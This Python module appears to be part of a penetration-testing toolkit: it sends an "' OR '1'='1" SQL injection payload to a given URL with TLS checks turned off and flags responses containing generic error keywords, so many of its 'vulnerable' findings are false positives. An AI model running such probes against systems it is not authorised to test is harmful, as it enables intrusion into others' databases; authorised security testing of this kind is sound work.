"""
Simple SQL Injection Testing Module

IMPORTANT: This tool should only be used for:
- Authorized penetration testing engagements
- Security research in controlled environments
- Educational purposes
- Testing your own systems or systems with explicit written permission

Unauthorized use is illegal and unethical.
"""

import logging
import requests
from typing import Dict, Any

logger = logging.getLogger(__name__)


class SimpleSQLInjectionTester:
    """
    Simple SQL Injection vulnerability tester.
    Tests for basic SQL injection vulnerabilities using common payloads.
    """

    def __init__(self):
        self.timeout = 10
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'RedTeam-SQLTest/1.0'
        })

    def test_sql_injection(self, target_url: str, method: str = 'GET',
                          parameter: str = None, custom_payload: str = None) -> Dict[str, Any]:
        """
        Test a target URL for SQL injection vulnerabilities.

        Args:
            target_url: The target URL to test
            method: HTTP method (GET or POST)
            parameter: Optional specific parameter to test
            custom_payload: Optional custom SQL injection payload

        Returns:
            Dictionary with test results
        """
        logger.warning(f"Testing SQL injection on: {target_url}")

        # Use custom payload or default
        payload = custom_payload if custom_payload else "' OR '1'='1"

        try:
            # Test the payload
            if method.upper() == 'GET':
                response = self.session.get(
                    target_url + payload if not parameter else target_url,
                    params={parameter: payload} if parameter else None,
                    timeout=self.timeout,
                    verify=False
                )
            else:
                data = {parameter: payload} if parameter else {'input': payload}
                response = self.session.post(
                    target_url,
                    data=data,
                    timeout=self.timeout,
                    verify=False
                )

            # Check for SQL error indicators
            sql_error_indicators = [
                'error', 'sql', 'mysql', 'sqlite', 'postgresql', 'oracle',
                'syntax', 'unexpected', 'warning', 'mariadb', 'mssql',
                'pg_query', 'odbc', 'jdbc', 'driver'
            ]

            response_text_lower = response.text.lower()
            errors_found = []

            for indicator in sql_error_indicators:
                if indicator in response_text_lower:
                    errors_found.append(indicator)

            # Determine vulnerability status
            if errors_found:
                return {
                    "status": "success",
                    "message": "SQL Injection potentially vulnerable",
                    "vulnerable": True,
                    "details": {
                        "target_url": target_url,
                        "payload_used": payload,
                        "method": method,
                        "parameter": parameter,
                        "error_indicators_found": errors_found,
                        "response_status": response.status_code,
                        "evidence": "SQL error indicators detected in response"
                    }
                }
            else:
                # No errors found - could be vulnerable (blind) or not vulnerable
                return {
                    "status": "inconclusive",
                    "message": "No SQL errors detected - may not be vulnerable or could be blind SQL injection",
                    "vulnerable": False,
                    "details": {
                        "target_url": target_url,
                        "payload_used": payload,
                        "method": method,
                        "parameter": parameter,
                        "response_status": response.status_code,
                        "note": "No error indicators found. Consider testing with time-based or boolean-based payloads."
                    }
                }

        except requests.exceptions.Timeout:
            return {
                "status": "timeout",
                "message": "Request timed out - could indicate time-based SQL injection",
                "vulnerable": None,
                "details": {
                    "target_url": target_url,
                    "payload_used": payload,
                    "timeout": self.timeout,
                    "recommendation": "Test with time-based SQL injection payloads"
                }
            }

        except requests.exceptions.RequestException as e:
            logger.error(f"Request error during SQL injection test: {str(e)}")
            return {
                "status": "error",
                "message": f"Error during testing: {str(e)}",
                "vulnerable": None,
                "details": {
                    "target_url": target_url,
                    "error": str(e)
                }
            }

        except Exception as e:
            logger.error(f"Unexpected error during SQL injection test: {str(e)}", exc_info=True)
            return {
                "status": "error",
                "message": f"Unexpected error: {str(e)}",
                "vulnerable": None
            }

    def close(self):
        """Clean up resources"""
        self.session.close()
